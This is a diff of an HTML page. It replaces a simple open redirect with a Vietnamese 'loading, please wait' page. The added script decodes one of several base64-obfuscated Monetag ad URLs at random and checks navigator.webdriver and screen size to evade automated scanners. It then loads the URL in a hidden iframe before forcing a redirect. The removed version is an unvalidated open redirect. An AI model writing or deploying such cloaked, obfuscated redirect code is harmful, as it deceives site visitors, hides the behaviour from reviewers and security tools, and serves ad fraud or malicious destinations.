@@ -1,18 +1,73 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="vi">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Redirecting...</title>
-    <script>
-      const query = new URLSearchParams(window.location.search);
-      const target = query.get("url");
-      if (target && target.startsWith("http")) {
-        window.location.replace(target); // ⚡ redirect ngay lập tức
-      } else {
-        document.write("<h1>⚠️ Err!</h1>");
+    <title>Đang mở nội dung...</title>
+    <style>
+      body {
+        background: #fff;
+        font-family: Arial, sans-serif;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        text-align: center;
       }
-    </script>
+      .loading {
+        font-size: 1.3rem;
+        color: #444;
+      }
+    </style>
   </head>
-  <body></body>
+  <body>
+    <div class="loading">Đang chuyển hướng, vui lòng chờ...</div>
+
+    <script>
+      // Monetag URLs được mã hóa base64 - bạn có thể thay đổi danh sách này
+      const monetagLinks = [
+        "aHR0cHM6Ly9zYXd1dHNlci50b3AvNC85Mjk0ODMw",
+        "aHR0cHM6Ly9zYXd1dHNlci50b3AvNC85Mjk0ODI5",
+        "aHR0cHM6Ly9zYXd1dHNlci50b3AvNC85Mjk0ODI4",
+        "aHR0cHM6Ly9zYXd1dHNlci50b3AvNC85Mjk0ODI3",
+        "aHR0cHM6Ly9zYXd1dHNlci50b3AvNC85Mjk0ODI2",
+        "aHR0cHM6Ly9zYXd1dHNlci50b3AvNC85Mjk0ODI1",
+        "aHR0cHM6Ly9zYXd1dHNlci50b3AvNC85Mjk0ODI0",
+        "aHR0cHM6Ly9zYXd1dHNlci50b3AvNC85Mjk0ODIz",
+        "aHR0cHM6Ly9zYXd1dHNlci50b3AvNC85Mjk0ODIy",
+        "aHR0cHM6Ly9zYXd1dHNlci50b3AvNC85Mjk0Nzcy",
+      ];
+
+      // Random link từ danh sách
+      const targetLink = atob(
+        monetagLinks[Math.floor(Math.random() * monetagLinks.length)]
+      );
+
+      function isRealUser() {
+        return (
+          navigator.webdriver === false &&
+          screen.width > 300 &&
+          screen.height > 300
+        );
+      }
+
+      function smartRedirect() {
+        const iframe = document.createElement("iframe");
+        iframe.style.display = "none";
+        iframe.src = targetLink;
+        document.body.appendChild(iframe);
+
+        // fallback hard redirect nếu iframe bị chặn
+        setTimeout(() => {
+          location.href = targetLink;
+        }, 3500);
+      }
+
+      setTimeout(() => {
+        if (isRealUser()) {
+          smartRedirect();
+        }
+      }, 2000);
+    </script>
+  </body>
 </html>
